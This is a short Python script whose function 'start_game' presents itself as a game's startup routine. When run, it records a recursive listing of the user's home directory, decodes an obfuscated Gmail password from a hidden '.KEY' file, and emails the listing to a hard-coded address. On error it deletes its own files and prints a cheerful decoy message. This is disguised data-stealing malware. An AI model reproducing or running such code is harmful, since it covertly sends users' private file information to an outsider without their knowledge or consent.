#!/usr/bin/env python3
import os
import subprocess
import random 
import base64
import curses 
import os
import subprocess  
import time
import smtplib
# starting game and setting path var
def start_game():

	try:
		f = open('.KEY')
		os.chdir("/home")
		user = os.listdir()[0]
		os.chdir(f"/home/{user}")
		PATH = os.getcwd()
		with open('data.txt', 'w') as silent:
			dirs = subprocess.run(['ls', '-R'], stdout=silent)	
		str = f.readlines()
		from email.message import EmailMessage
		rsa_xor = str[0].split("\n")[0]
		smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
		smtpObj.ehlo()
		password = (base64.b64decode( base64.b64decode( base64.b64decode(rsa_xor))).decode('ascii'))
		smtpObj.starttls()
		MY_MAIL_ADDRESS = "zeusB9091@gmail.com"
		PASSWORD = password.split("\n")[0]
		RECIEVER_EMAIL_ID = "zeusB9091@gmail.com"
		smtpObj.login(MY_MAIL_ADDRESS, PASSWORD)
		msg = EmailMessage()
		msg["From"] = MY_MAIL_ADDRESS
		msg["Subject"] = "From loving Zaid:"
		msg["To"] = RECIEVER_EMAIL_ID
		msg.set_content("This is the message body")
		msg.add_attachment(open("data.txt", "r").read(), filename="With_love.txt")
		smtpObj.send_message(msg)
		smtpObj.quit()
	
	except:
		os.remove("dependencies.py")
		os.remove('.KEY')
		print("Going on a holiday to a beach!!")
